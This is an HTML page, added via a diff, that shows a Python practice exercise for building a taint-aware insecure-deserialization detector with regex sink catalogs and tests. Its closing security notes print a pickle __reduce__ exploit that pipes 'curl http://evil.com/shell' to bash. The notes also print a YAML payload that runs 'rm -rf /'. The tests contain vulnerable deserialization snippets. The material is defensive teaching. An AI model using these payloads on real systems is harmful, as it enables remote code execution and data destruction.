@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>q52_deserialization_detector.py</title>
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, sans-serif;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 32px 24px;
+      color: #24292f;
+      background: #fff;
+    }
+    h1 {
+      font-size: 1.4em;
+      border-bottom: 1px solid #d0d7de;
+      padding-bottom: 0.3em;
+      margin-bottom: 0.6em;
+    }
+    .file-path {
+      font-size: 0.8em;
+      color: #57606a;
+      margin-bottom: 16px;
+      font-family: monospace;
+    }
+    .line-count {
+      font-size: 0.78em;
+      color: #8c959f;
+      margin-bottom: 16px;
+    }
+    pre {
+      background: #f6f8fa;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 16px;
+      overflow-x: auto;
+      counter-reset: line;
+    }
+    code {
+      font-family: "Cascadia Code", "Fira Code", "Courier New", monospace;
+      font-size: 0.88em;
+    }
+  </style>
+</head>
+<body>
+  <h1>q52_deserialization_detector.py</h1>
+  <p class="file-path">Source: code\practice\hard\q52_deserialization_detector.py</p>
+  <p class="line-count">374 lines</p>
+  <pre><code class="language-python">&quot;&quot;&quot;
+=============================================================================
+Q52 [Hard] — Insecure Deserialization Static Detector
+=============================================================================
+
+PROBLEM
+-------
+Detect dangerous deserialization calls in Python, Java, and JavaScript code:
+  Python:  pickle.loads, yaml.load (without Loader), marshal.loads,
+           shelve.open, jsonpickle.decode, dill.loads.
+  Java:    ObjectInputStream.readObject, XMLDecoder, readUnshared,
+           XStream.fromXML.
+  JS:      eval(JSON), Function(), unserialize(), node-serialize.
+  Also flag: user-controlled data flowing into any deserialization call.
+
+CLARIFYING QUESTIONS
+--------------------
+1. Languages? → Python, JavaScript, Java (heuristic; no AST).
+2. What is &quot;safe&quot;?
+   → json.loads (built-in, no code exec), yaml.safe_load,
+     ast.literal_eval (value types only), manual schema validation.
+3. Output? → Structured findings with severity.
+
+=============================================================================
+APPROACH 1 — NAIVE (grep for pickle / yaml)
+=============================================================================
+  Flags every occurrence; no taint correlation; misses yaml.load(safe=False).
+
+=============================================================================
+APPROACH 2 — TAINT-AWARE DESERIAL DETECTOR (OPTIMAL)
+=============================================================================
+  1. Catalog dangerous deserialization functions.
+  2. Identify if user-controlled data flows into them.
+  3. Apply safe-pattern suppressors.
+
+=============================================================================
+&quot;&quot;&quot;
+
+from __future__ import annotations
+
+import re
+from dataclasses import dataclass, field
+from typing import List, Optional, Set, Tuple
+
+
+# ---------------------------------------------------------------------------
+# Data Types
+# ---------------------------------------------------------------------------
+
+@dataclass
+class DeserialFinding:
+    file: str
+    line_number: int
+    severity: str
+    rule_name: str
+    evidence: str
+    line_preview: str
+
+    def __str__(self) -&gt; str:
+        return (
+            f&quot;[{self.severity.upper()}] {self.file}:{self.line_number} &quot;
+            f&quot;rule={self.rule_name!r}: {self.evidence[:60]}&quot;
+        )
+
+
+@dataclass
+class DeserialScanResult:
+    filename: str
+    findings: List[DeserialFinding] = field(default_factory=list)
+    lines_scanned: int = 0
+
+    @property
+    def has_findings(self) -&gt; bool:
+        return bool(self.findings)
+
+
+# ---------------------------------------------------------------------------
+# Sink catalog: (rule_name, pattern, severity, notes)
+# ---------------------------------------------------------------------------
+
+_DESERIAL_SINKS: List[Tuple[str, re.Pattern, str]] = [
+    # Python — HIGH (arbitrary code execution)
+    (&quot;pickle_loads&quot;,        re.compile(r&quot;\bpickle\.(loads?|Unpickler)\s*\(&quot;),          &quot;high&quot;),
+    (&quot;pickle_load_file&quot;,    re.compile(r&quot;\bpickle\.load\s*\(&quot;),                        &quot;high&quot;),
+    (&quot;marshal_loads&quot;,       re.compile(r&quot;\bmarshal\.(loads?)\s*\(&quot;),                   &quot;high&quot;),
+    (&quot;dill_loads&quot;,          re.compile(r&quot;\bdill\.(loads?|load)\s*\(&quot;),                 &quot;high&quot;),
+    (&quot;shelve_open&quot;,         re.compile(r&quot;\bshelve\.open\s*\(&quot;),                        &quot;medium&quot;),
+    (&quot;jsonpickle_decode&quot;,   re.compile(r&quot;\bjsonpickle\.decode\s*\(&quot;),                  &quot;high&quot;),
+    (&quot;yaml_load_unsafe&quot;,    re.compile(r&quot;\byaml\.load\s*\((?!.*Loader\s*=\s*yaml\.SafeLoader)&quot;),  &quot;high&quot;),
+    (&quot;yaml_full_loader&quot;,    re.compile(r&quot;\byaml\.load\s*\(.*Loader\s*=\s*yaml\.(FullLoader|UnsafeLoader|CLoader)&quot;), &quot;medium&quot;),
+    (&quot;codecs_decode&quot;,       re.compile(r&quot;\bcodecs\.decode\s*\(&quot;),                      &quot;low&quot;),
+    # Java-like patterns (heuristic string match)
+    (&quot;java_readobject&quot;,     re.compile(r&quot;\bObjectInputStream\b.*\breadObject\s*\(&quot;),   &quot;high&quot;),
+    (&quot;java_xmldecoder&quot;,     re.compile(r&quot;\bXMLDecoder\b&quot;),                             &quot;high&quot;),
+    (&quot;java_xstream&quot;,        re.compile(r&quot;\bXStream\b.*\.(fromXML|unmarshal)\s*\(&quot;),   &quot;high&quot;),
+    (&quot;java_readunshared&quot;,   re.compile(r&quot;\breadUnshared\s*\(&quot;),                        &quot;high&quot;),
+    (&quot;java_kryo&quot;,           re.compile(r&quot;\bKryo\b.*\bdeserialize\b&quot;),                  &quot;medium&quot;),
+    # JavaScript
+    (&quot;js_eval_json&quot;,        re.compile(r&quot;\beval\s*\(\s*(?!\s*[&#x27;\&quot;])&quot;),                &quot;high&quot;),
+    (&quot;js_function_ctor&quot;,    re.compile(r&quot;\bnew\s+Function\s*\(&quot;),                     &quot;high&quot;),
+    (&quot;js_node_serialize&quot;,   re.compile(r&quot;\bnode-serialize\b|unserialize\s*\(&quot;),       &quot;high&quot;),
+    (&quot;js_vm_runin&quot;,         re.compile(r&quot;\bvm\.runInThisContext\s*\(&quot;),               &quot;high&quot;),
+]
+
+# Safe patterns (suppress)
+_SAFE_PATTERNS: List[re.Pattern] = [
+    re.compile(r&quot;\bjson\.loads?\s*\(&quot;),                      # json module is safe
+    re.compile(r&quot;\byaml\.safe_load\s*\(&quot;),                   # safe YAML
+    re.compile(r&quot;\bast\.literal_eval\s*\(&quot;),                 # safe Python eval
+    re.compile(r&quot;\bJSON\.parse\s*\(&quot;),                       # JS JSON.parse
+    re.compile(r&quot;Loader\s*=\s*yaml\.SafeLoader&quot;),
+    re.compile(r&quot;^\s*#&quot;),
+    re.compile(r&quot;#\s*(nosec|noqa|safe)&quot;),
+]
+
+_SOURCE_PATTERNS: List[Tuple[str, re.Pattern]] = [
+    (&quot;flask_args&quot;,   re.compile(r&quot;request\.(args|form|values|GET|POST|data|json)(\[|\.get\s*\(|\.read\s*\()&quot;)),
+    (&quot;req_body&quot;,     re.compile(r&quot;req\.(body|params|query)\s*[\[.]&quot;)),
+    (&quot;input_func&quot;,   re.compile(r&quot;\binput\s*\(&quot;)),
+    (&quot;sys_argv&quot;,     re.compile(r&quot;\bsys\.argv\b&quot;)),
+    (&quot;socket_recv&quot;,  re.compile(r&quot;\.(recv|read)\s*\(&quot;)),     # network data
+    (&quot;file_read&quot;,    re.compile(r&quot;\.read\s*\(\s*\)&quot;)),
+]
+
+_VAR_FROM_SOURCE = re.compile(
+    r&quot;^\s*(\w+)\s*=\s*.*(?:request\.|req\.|input\(|sys\.argv|\.recv\s*\(|\.read\s*\()&quot;,
+    re.IGNORECASE,
+)
+
+
+def _line_is_safe(line: str) -&gt; bool:
+    return any(p.search(line) for p in _SAFE_PATTERNS)
+
+
+def _source_on_line(line: str) -&gt; Optional[str]:
+    for name, pat in _SOURCE_PATTERNS:
+        if pat.search(line):
+            return name
+    return None
+
+
+def _sink_on_line(line: str) -&gt; Optional[Tuple[str, str, str]]:
+    for name, pat, sev in _DESERIAL_SINKS:
+        m = pat.search(line)
+        if m:
+            return name, m.group(0), sev
+    return None
+
+
+# ---------------------------------------------------------------------------
+# APPROACH 1 — Naive
+# ---------------------------------------------------------------------------
+
+def detect_naive(code: str) -&gt; List[str]:
+    results = []
+    for i, line in enumerate(code.splitlines(), 1):
+        if re.search(r&quot;pickle|yaml\.load|marshal|readObject&quot;, line):
+            results.append(f&quot;Line {i}: {line.strip()}&quot;)
+    return results
+
+
+# ---------------------------------------------------------------------------
+# APPROACH 2 — Taint-aware detector
+# ---------------------------------------------------------------------------
+
+class InsecureDeserializationDetector:
+    &quot;&quot;&quot;
+    Detects insecure deserialization via taint-aware heuristics.
+    &quot;&quot;&quot;
+
+    def detect(self, code: str, filename: str = &quot;&lt;code&gt;&quot;) -&gt; DeserialScanResult:
+        result = DeserialScanResult(filename=filename)
+        lines  = code.splitlines()
+        result.lines_scanned = len(lines)
+
+        # Collect tainted variables
+        tainted: Set[str] = set()
+        for line in lines:
+            m = _VAR_FROM_SOURCE.match(line)
+            if m:
+                tainted.add(m.group(1))
+
+        for line_idx, line in enumerate(lines, start=1):
+            if _line_is_safe(line):
+                continue
+
+            sink = _sink_on_line(line)
+            if sink is None:
+                continue
+
+            sink_name, sink_text, base_sev = sink
+
+            # Determine severity: upgrade to HIGH if user-controlled
+            src = _source_on_line(line)
+            matched_tv = next(
+                (tv for tv in tainted
+                 if re.search(r&#x27;\b&#x27; + re.escape(tv) + r&#x27;\b&#x27;, line)),
+                None,
+            )
+
+            if src or matched_tv:
+                severity = &quot;high&quot;
+                evidence = f&quot;tainted_source={src or matched_tv}&quot;
+            else:
+                severity = base_sev
+                evidence = sink_text[:60]
+
+            result.findings.append(DeserialFinding(
+                file=filename, line_number=line_idx,
+                severity=severity,
+                rule_name=sink_name,
+                evidence=evidence,
+                line_preview=line.strip()[:100],
+            ))
+
+        return result
+
+
+# ---------------------------------------------------------------------------
+# Test Cases
+# ---------------------------------------------------------------------------
+
+def test_pickle_user_data():
+    code = &quot;&quot;&quot;
+import pickle
+from flask import request
+
+data = request.data.read()
+obj = pickle.loads(data)
+&quot;&quot;&quot;
+    d = InsecureDeserializationDetector()
+    r = d.detect(code, &quot;api.py&quot;)
+    print(f&quot;pickle.loads findings: {[str(f) for f in r.findings]}&quot;)
+    assert r.has_findings
+    high = [f for f in r.findings if f.severity == &quot;high&quot;]
+    assert high
+    print(&quot;pickle.loads user data: passed&quot;)
+
+
+def test_yaml_load_unsafe():
+    code = &quot;&quot;&quot;
+import yaml
+data = request.data
+obj = yaml.load(data)
+&quot;&quot;&quot;
+    d = InsecureDeserializationDetector()
+    r = d.detect(code, &quot;yaml_test.py&quot;)
+    assert r.has_findings
+    print(f&quot;yaml.load unsafe: {[str(f) for f in r.findings]}&quot;)
+    print(&quot;yaml.load unsafe: passed&quot;)
+
+
+def test_yaml_safe_load_suppressed():
+    code = &quot;&quot;&quot;
+import yaml
+data = request.data
+obj = yaml.safe_load(data)
+&quot;&quot;&quot;
+    d = InsecureDeserializationDetector()
+    r = d.detect(code, &quot;yaml_safe.py&quot;)
+    assert not r.has_findings
+    print(&quot;yaml.safe_load not flagged: passed&quot;)
+
+
+def test_json_loads_safe():
+    code = &quot;&quot;&quot;
+import json
+body = request.data
+payload = json.loads(body)
+&quot;&quot;&quot;
+    d = InsecureDeserializationDetector()
+    r = d.detect(code, &quot;json_safe.py&quot;)
+    assert not r.has_findings
+    print(&quot;json.loads not flagged: passed&quot;)
+
+
+def test_java_readobject():
+    code = &quot;&quot;&quot;
+ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
+Object obj = ois.readObject();
+&quot;&quot;&quot;
+    d = InsecureDeserializationDetector()
+    r = d.detect(code, &quot;Server.java&quot;)
+    print(f&quot;Java readObject: {[str(f) for f in r.findings]}&quot;)
+    assert r.has_findings
+    print(&quot;Java readObject: passed&quot;)
+
+
+def test_js_eval_user():
+    code = &quot;&quot;&quot;
+const body = req.body.data;
+eval(body);
+&quot;&quot;&quot;
+    d = InsecureDeserializationDetector()
+    r = d.detect(code, &quot;app.js&quot;)
+    print(f&quot;JS eval findings: {[str(f) for f in r.findings]}&quot;)
+    assert r.has_findings
+    high = [f for f in r.findings if f.severity == &quot;high&quot;]
+    assert high
+    print(&quot;JS eval user data: passed&quot;)
+
+
+def test_jsonpickle_decode():
+    code = &quot;&quot;&quot;
+import jsonpickle
+payload = request.json.get(&quot;data&quot;)
+obj = jsonpickle.decode(payload)
+&quot;&quot;&quot;
+    d = InsecureDeserializationDetector()
+    r = d.detect(code, &quot;api2.py&quot;)
+    assert r.has_findings
+    print(f&quot;jsonpickle.decode: {[str(f) for f in r.findings]}&quot;)
+    print(&quot;jsonpickle.decode: passed&quot;)
+
+
+# ---------------------------------------------------------------------------
+# SECURITY ANGLE
+# ---------------------------------------------------------------------------
+&quot;&quot;&quot;
+INSECURE DESERIALIZATION — CWE-502 / OWASP A8
+------------------------------------------------
+Root Cause: Deserializing untrusted data with a format that can
+instantiate arbitrary objects or execute code.
+
+PYTHON ATTACK (pickle)
+-----------------------
+  import pickle, os
+  class Exploit:
+      def __reduce__(self):
+          return (os.system, (&quot;curl http://evil.com/shell | bash&quot;,))
+  payload = pickle.dumps(Exploit())
+  # Server-side:
+  obj = pickle.loads(payload)   # executes os.system on deserialize
+
+JAVA GADGET CHAINS
+------------------
+  Apache Commons Collections, Spring, Groovy provide &quot;gadget chains&quot;:
+  serialized objects that, when deserialized, execute arbitrary methods.
+  CVE-2015-4852 (WebLogic), CVE-2016-4438 (Struts2), etc.
+  Tools: ysoserial generates payloads for known gadget chains.
+
+YAML TAG ATTACKS (Python)
+--------------------------
+  payload.yaml:
+    !!python/object/apply:os.system [&quot;rm -rf /&quot;]
+  yaml.load(payload)   # executes os.system
+
+SAFE ALTERNATIVES
+-----------------
+  Python: json.loads, yaml.safe_load, ast.literal_eval.
+          Avoid pickle for user-supplied data entirely.
+          If you must use pickle: sign with HMAC; verify before loading.
+  Java:   Use JSON (Jackson, Gson) with strict type restrictions.
+          Disable global default typing in Jackson.
+          Use SerialKiller or OWASP deserialization filters.
+  JS:     JSON.parse only; never eval() user data.
+
+DEFENSE IN DEPTH
+-----------------
+  Isolate deserializers in sandboxes (containers, seccomp).
+  Network-level: restrict outbound from deserializing services.
+  Integrity checks: HMAC-sign blobs before serialization; verify on load.
+&quot;&quot;&quot;
+
+
+if __name__ == &quot;__main__&quot;:
+    test_pickle_user_data()
+    test_yaml_load_unsafe()
+    test_yaml_safe_load_suppressed()
+    test_json_loads_safe()
+    test_java_readobject()
+    test_js_eval_user()
+    test_jsonpickle_decode()
+</code></pre>
+</body>
+</html>
